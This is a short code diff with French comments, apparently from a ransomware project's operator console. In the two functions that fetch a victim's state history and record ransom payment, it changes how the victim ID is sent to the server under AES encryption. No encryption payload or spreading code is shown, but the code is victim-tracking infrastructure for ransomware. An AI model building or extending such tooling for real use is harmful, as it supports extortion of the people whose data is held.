@@ -75,11 +75,11 @@ def affichage_historique_etat_victime():
     # Récupération de l'id de la victime
     victim_id = input("Entrez le numéro de la victime : ")
     # Envoi de la requête
-    msg = message.set_message("HISTORY_REQ")
+    msg = message.set_message("HISTORY_REQ", victim_id)
     encrypted_msg = security.aes_encrypt(msg, key)
     network.send_message(s, encrypted_msg)
-    encrypted_id = security.aes_encrypt(victim_id, key)
-    network.send_message(s, encrypted_id)
+    #encrypted_id = security.aes_encrypt(victim_id, key)
+    #network.send_message(s, encrypted_id)
 
     # Récupération de la réponse
     response = network.receive_message(s)
@@ -112,11 +112,11 @@ def affichage_payement_rancon():
     # Récupération de l'id de la victime
     victim_id = input("Entrez le numéro de la victime : ")
     # Envoi de la requête
-    msg = message.set_message("CHANGE_STATE")
+    msg = message.set_message("CHANGE_STATE", victim_id)
     encrypted_msg = security.aes_encrypt(msg, key)
     network.send_message(s, encrypted_msg)
-    encrypted_id = security.aes_encrypt(victim_id, key)
-    network.send_message(s, encrypted_id)
+    #encrypted_id = security.aes_encrypt(victim_id, key)
+    #network.send_message(s, encrypted_id)
     # Récupération de la réponse
     response = network.receive_message(s)
     if response is None:
